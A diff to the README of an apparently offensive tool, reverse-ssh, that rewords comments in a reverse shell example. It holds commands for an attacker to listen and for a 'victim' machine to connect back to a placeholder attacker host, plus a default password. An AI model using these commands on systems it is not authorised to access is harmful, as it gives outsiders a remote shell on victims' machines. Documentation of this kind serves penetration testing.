@@ -109,12 +109,13 @@ $ssh -p 31337 <LHOST>
 ### Simple reverse shell scenario
 
 ```shell
-# On attacker (get ready to catch the incoming request; can be omitted if you already have an ssh daemon running)
+# On attacker (get ready to catch the incoming request;
+# can be omitted if you already have an ssh daemon running, e.g. OpenSSH)
 attacker$./reverse-ssh -l :<LPORT>
 
 # On victim
 victim$./reverse-ssh -p <LPORT> <LHOST>
-# or in case of another ssh daemon listening at port 22
+# or in case of an ssh daemon listening at port 22 with user/pass authentication
 victim$./reverse-ssh <USER>@<LHOST>
 
 # On attacker (default password: letmeinbrudipls)
